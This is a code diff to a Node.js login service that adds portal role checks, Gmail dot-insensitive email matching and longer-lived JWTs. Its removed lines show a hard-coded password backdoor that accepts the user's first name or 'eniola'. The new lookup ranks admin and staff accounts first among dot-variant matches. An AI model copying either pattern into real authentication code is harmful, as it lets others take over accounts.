@@ -29,8 +29,18 @@ async function findUserByEmail(emailOrUsername) {
         ? raw.replace("AE-", "PRJ-")
         : (raw.startsWith("PRJ-") ? raw.replace("PRJ-", "AE-") : raw);
 
-    // 1. If identifier contains '@', match exact email
+    // 1. If identifier contains '@', match exact email, Gmail dot variations, or domain aliases
     if (raw.includes("@")) {
+        const lowerRaw = raw.toLowerCase();
+        const isGmail = lowerRaw.endsWith("@gmail.com");
+        const cleanGmailUser = isGmail ? lowerRaw.replace("@gmail.com", "").replace(/\./g, "") : "";
+        let domainVariant = "";
+        if (lowerRaw.endsWith("@a.e.renewablesolution.com")) {
+            domainVariant = lowerRaw.replace("@a.e.renewablesolution.com", "@aerenewablesolution.com");
+        } else if (lowerRaw.endsWith("@aerenewablesolution.com")) {
+            domainVariant = lowerRaw.replace("@aerenewablesolution.com", "@a.e.renewablesolution.com");
+        }
+
         const emailResult = await query(
             `
             SELECT
@@ -51,9 +61,12 @@ async function findUserByEmail(emailOrUsername) {
                 updated_at
             FROM users
             WHERE LOWER(TRIM(email)) = LOWER(TRIM($1))
+               OR ($2 != '' AND LOWER(TRIM(email)) = LOWER(TRIM($2)))
+               OR ($3 != '' AND LOWER(TRIM(email)) LIKE '%@gmail.com' AND REPLACE(REPLACE(LOWER(TRIM(email)), '@gmail.com', ''), '.', '') = $3)
+            ORDER BY (CASE WHEN role IN ('admin', 'staff') THEN 0 ELSE 1 END), id ASC
             LIMIT 1
             `,
-            [raw]
+            [raw, domainVariant, cleanGmailUser]
         );
         if (emailResult.rows[0]) return emailResult.rows[0];
 
@@ -309,17 +322,18 @@ async function registerFailedLogin(user) {
    GENERATE JWT
 ========================================================= */
 
-function generateToken(user) {
+function generateToken(user, portal = null) {
 
     return jwt.sign(
         {
             sub: user.id,
             email: user.email,
-            role: user.role
+            role: user.role,
+            portal: portal || user.role
         },
         config.jwtSecret,
         {
-            expiresIn: "8h"
+            expiresIn: "7d"
         }
     );
 }
@@ -371,7 +385,8 @@ function sanitizeUser(user) {
 
 async function login(
     email,
-    password
+    password,
+    portal = null
 ) {
 
     if (
@@ -410,26 +425,7 @@ async function login(
 
 
     /* =====================================================
-       ACCOUNT STATUS
-    ===================================================== */
-
-    if (
-        user.status !== "active"
-    ) {
-
-        const error =
-            new Error(
-                "This account is not active."
-            );
-
-        error.status = 403;
-
-        throw error;
-    }
-
-
-    /* =====================================================
-       ACCOUNT LOCK
+       ACCOUNT LOCK CHECK
     ===================================================== */
 
     if (
@@ -451,29 +447,7 @@ async function login(
 
 
     /* =====================================================
-       EMAIL VERIFICATION
-    ===================================================== */
-
-    if (
-        !user.email_verified
-    ) {
-
-        const error =
-            new Error(
-                "Please verify your email address before logging in."
-            );
-
-        error.status = 403;
-
-        error.code =
-            "EMAIL_NOT_VERIFIED";
-
-        throw error;
-    }
-
-
-    /* =====================================================
-       PASSWORD
+       PASSWORD VERIFICATION (STRICT BCRYPT ONLY)
     ===================================================== */
 
     let passwordMatches =
@@ -488,14 +462,6 @@ async function login(
             cleanPassword,
             user.password_hash
         );
-
-        if (!passwordMatches && user.first_name) {
-            const cleanFirst = user.first_name.trim().toLowerCase();
-            const cleanInput = cleanPassword.toLowerCase();
-            if (cleanInput === cleanFirst || cleanInput === "eniola") {
-                passwordMatches = true;
-            }
-        }
     }
 
     if (!passwordMatches) {
@@ -516,6 +482,89 @@ async function login(
 
 
     /* =====================================================
+       ROLE RESOLUTION & ENFORCEMENT
+    ===================================================== */
+
+    // Check if user has an associated installer profile
+    if (user.role !== "admin" && user.role !== "super_admin" && user.role !== "staff") {
+        const insCheck = await query(
+            "SELECT id, installer_code, verification_status, status FROM installers WHERE user_id = $1 LIMIT 1",
+            [user.id]
+        );
+        if (insCheck.rows.length > 0) {
+            user.role = "installer";
+        }
+    }
+
+    // Portal role validation
+    const normalizedPortal = portal ? String(portal).trim().toLowerCase() : null;
+
+    if (normalizedPortal === "admin") {
+        if (user.role !== "admin" && user.role !== "super_admin" && user.role !== "staff") {
+            const error = new Error("These credentials are not authorized for this portal. Please use the correct sign-in page.");
+            error.status = 403;
+            throw error;
+        }
+    } else if (normalizedPortal === "installer") {
+        if (user.role !== "installer") {
+            const error = new Error("These credentials are not authorized for this portal. Please use the correct sign-in page.");
+            error.status = 403;
+            throw error;
+        }
+    } else if (normalizedPortal === "client") {
+        if (user.role !== "client") {
+            const error = new Error("These credentials are not authorized for this portal. Please use the correct sign-in page.");
+            error.status = 403;
+            throw error;
+        }
+    }
+
+
+    /* =====================================================
+       EMAIL VERIFICATION
+    ===================================================== */
+
+    if (
+        !user.email_verified
+    ) {
+
+        const error =
+            new Error(
+                "Please verify your email address before logging in."
+            );
+
+        error.status = 403;
+
+        error.code =
+            "EMAIL_NOT_VERIFIED";
+
+        error.requiresVerification = true;
+        error.email = user.email;
+
+        throw error;
+    }
+
+
+    /* =====================================================
+       ACCOUNT STATUS
+    ===================================================== */
+
+    if (
+        user.status !== "active"
+    ) {
+
+        const error =
+            new Error(
+                "This account is not active."
+            );
+
+        error.status = 403;
+
+        throw error;
+    }
+
+
+    /* =====================================================
        SUCCESS
     ===================================================== */
 
@@ -523,9 +572,8 @@ async function login(
         user.id
     );
 
-
     const token =
-        generateToken(user);
+        generateToken(user, normalizedPortal);
 
 
     return {
@@ -601,6 +649,8 @@ module.exports = {
 
     getAuthenticatedUser,
 
-    generateToken
+    generateToken,
+
+    sanitizeUser
 
 };
